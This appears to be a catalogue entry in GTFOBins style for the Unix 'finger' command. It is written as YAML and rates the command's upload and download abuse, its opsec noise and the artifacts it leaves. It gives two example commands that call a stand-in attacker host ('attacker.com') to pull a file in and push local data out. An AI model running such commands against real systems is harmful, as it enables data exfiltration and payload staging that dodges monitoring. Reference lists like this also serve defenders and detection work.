---
name: finger
capabilities:
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: finger x@attacker.com
  notes: The command hangs waiting for the remote peer to close the socket.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: finger DATA@attacker.com
  notes: The command hangs waiting for the remote peer to close the socket.
references:
- https://gtfobins.github.io/gtfobins/finger/
tags: []
---
